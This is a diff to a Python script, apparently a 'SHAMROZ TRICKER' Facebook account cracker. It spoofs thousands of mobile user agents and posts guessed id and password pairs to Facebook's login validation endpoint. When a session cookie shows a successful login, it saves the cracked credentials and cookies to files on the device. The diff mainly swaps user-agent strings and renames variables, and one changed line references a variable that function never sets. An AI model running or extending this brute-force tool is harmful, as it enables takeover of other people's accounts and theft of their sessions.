@@ -46,7 +46,7 @@ except ModuleNotFoundError:
 	os.system('python SHAMROZ-XD.py')
 ugen = []
 for xd in range(5000):
-	aa='Mozilla/5.0 (Linux; U; Android'
+	aa='Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
 	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
 	c=' en-us; GT-'
 	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -84,7 +84,7 @@ for xd in range(10000):
 	ugen.append(uaku)
 
 
-	aa='Mozilla/5.0 (Linux; U; Android'
+	aa='Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
 	b=random.choice(['6','7','8','9','10','11','12'])
 	c=' en-us; GT-'
 	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -114,7 +114,7 @@ for xd in range(3000):
 	ugen.append(memekk)
 	
 for t in range(10000):
-	aa='Mozilla/5.0 (Linux; Android 7.0; '
+	aa='Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
 	b=random.choice(['8.1.0','4','5','6','7','8','9','10','11','12'])
 	c='Hisense F102) '
 	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -165,6 +165,7 @@ syed =['Mozilla/5.0 (Linux; Android 12; SM-F415F Build/SP1A.210812.016; wv) Appl
 'Mozilla/5.0 (Linux; Android 10; SM-A015M Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75',
 'Mozilla/5.0 (Linux; Android 12; SM-F415F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75',
 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A127M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A127M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/22.0 Chrome/111.0.5563.116 Mobile Safari/537.36',]
 logo=("""\033[1;97m
 
@@ -179,8 +180,8 @@ logo=("""\033[1;97m
 \033[1;93m--------------------------------------------------
 \033[1;37m[-] OWNER     :\033[1;32m SHAMROZ TRICKER
 \033[1;37m[-] GITHUB    :\033[1;32m SH4MR0Z-TR1CK3R
-\033[1;37m[-] VERSION   :\033[1;32m               (1.0)
-\033[1;37m[-] STATUS    :\033[1;32m          ___FREE___
+\033[1;37m[-] VERSION   :\033[1;32m      (1.0)
+\033[1;37m[-] STATUS    :\033[1;32m    ___FREE___
 --------------------------------------------------""")
 def linex():
 	print('\033[0;97m--------------------------------------------------')
@@ -291,7 +292,7 @@ def mmm(ids,names,passlist):
 			head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="105", "Google Chrome";v="105"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
 			complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
 			SHONA=session.cookies.get_dict().keys()
-			if "c_user" in SHONA:
+			if "c_user" in SHAMROZ:
 				print('\33[38;5;208m[SHAMROZ-CP] %s | %s'%(ids,pas))
 				
 				open('/sdcard/SHAMROZ--CP.txt', 'a').write(ids+'|'+pas+'\n')
@@ -331,8 +332,8 @@ def ffb(ids,names,passlist):
 			getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
 			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 			complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			SHONA=session.cookies.get_dict().keys()
-			if "c_user" in SHONA:
+			SHAMROZ=session.cookies.get_dict().keys()
+			if "c_user" in SHAMROZ:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
 				print('\r\r\033[0;92m[SHAMROZ-OK] %s | %s'%(ids,pas))
